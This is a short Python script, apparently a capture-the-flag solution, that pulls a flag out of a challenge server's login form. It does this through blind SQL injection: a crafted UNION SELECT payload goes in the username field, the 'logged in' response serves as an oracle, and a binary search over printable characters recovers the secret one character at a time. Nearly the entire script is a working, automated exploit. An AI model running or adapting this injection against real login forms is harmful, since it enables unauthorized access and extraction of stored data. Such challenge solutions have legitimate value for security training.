import requests


def check(flag, num):
    payload = f"admin' union select 0,'foo','bar','{flag + chr(num)}' order by 4,1 --"
    url = 'http://challenge.alguien.site:31337/login'
    resp = requests.post(
        url,
        data={'username': payload, 'password': '123456'}
    )
    if 'Nice, you are logged in!' in resp.text:
        return True # num > x
    return False # num <= x


def binary_search(inf, sup, flag):
    mid = (inf + sup) // 2

    if check(flag, mid): # x < mid
        if (mid-inf) == 1:
            return inf
        return binary_search(inf, mid-1, flag)
    else: # x >= mid
        if (sup-mid) == 1:
            if check(flag, sup): # x < sup
                return mid
            else:
                return sup
        return binary_search(mid, sup, flag)


inf, sup, flag = 32, 126, ''
while '}' not in flag:
    x = binary_search(inf, sup, flag)
    flag += chr(x)
    print(flag)
